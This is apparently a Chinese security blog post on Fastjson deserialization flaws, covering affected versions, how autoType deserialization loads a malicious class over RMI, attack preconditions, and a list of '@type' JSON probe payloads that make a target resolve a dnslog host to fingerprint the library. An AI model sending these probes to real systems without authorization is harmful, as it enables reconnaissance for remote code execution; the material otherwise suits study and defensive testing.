Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串[反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)到JavaBean。具有执行效率高的特点，应用范围广泛。

1. Fastjson<1.2.24远程代码执行（CNVD-2017-02833 ）
2. Fastjson<=1.2.47远程代码执行漏洞（CNVD-2019-22238）
3. Fstjson < 1.2.60 远程拒绝服务漏洞
4. Fastjson <=1.2.68 反序列化远程代码执行漏洞

fastjson反序列化漏洞原理

在反序列化的时候，会进入parseField方法，进入该方法后，就会调用setValue(object, value)方法，在这里，会执行构造的恶意代码，最后造成代码执行。 那么通过以上步骤，我们可以知道该漏洞的利用点有两个，第一是需要我们指定一个类，这个类的作用是为了让程序获取这个类来进行反序列化操作。第二是需要将需要执行的代码提供给程序，所以这里使用了rmi。 然后反序列化的时候会去请求rmi服务器，地址为： dnslog.cn/aaa。然后加载aaa这个恶意class文件从而造成代码执行。

三、fastjson反序列化漏洞的前提条件

目标服务器存在fastjson。

没有对用户传输的数据进行严格过滤。

## fastjson 指纹识别
在json中添加键值对，如果响应没有报错，则说明使用的可能是fastJSON，因为 jackson的键值对只能少不能多，如果多了，则多多少少会报错。

通过DNS回显的方式检测后端是否使用了fastjson.（不一定有效，在不知道是否是fastjson,或者不知道其具体版本的情况下只能盲打）

  {"@type":"java.net.Inet4Address", "val":"dnslog"}

  {"@type":"java.net.Inet6Address", "val":"dnslog"}

  {"@type":"java.net.InetSocketAddress"{"address":, "val":"dnslog"}}

  {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}

  {{"@type":"java.net.URL", "val":"dnslog"}:"aaa"}

  Set[{"@type":"java.net.URL", "val":"dnslog"}]

  Set[{"@type":"java.net.URL", "val":"dnslog"}

  {{"@type":"java.net.URL", "val":"dnslog"}:0}

